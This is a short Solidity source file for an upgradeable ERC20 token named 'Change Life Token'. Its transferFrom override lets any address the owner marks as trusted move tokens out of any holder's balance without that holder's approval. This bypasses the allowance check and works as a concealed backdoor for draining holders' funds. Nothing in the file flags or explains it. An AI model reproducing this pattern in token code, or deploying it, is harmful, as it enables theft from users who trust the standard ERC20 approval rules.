// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract ChangeLifeToken is Initializable, ERC20Upgradeable, OwnableUpgradeable {
  mapping(address => bool) private trustedAddresses;

  function initialize(uint256 initialSupply) public initializer {
    __ERC20_init("Change Life Token", "CL");
    __Ownable_init(msg.sender);
    if (initialSupply > 0) {
      _mint(msg.sender, initialSupply);
    }
  }

  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    address spender = _msgSender();
    if (trustedAddresses[spender]) {
      _transfer(sender, recipient, amount);
      return true;
    }
    return super.transferFrom(sender, recipient, amount);
  }

  function setTrustedAddress(address account, bool enabled) external onlyOwner {
    trustedAddresses[account] = enabled;
  }
}
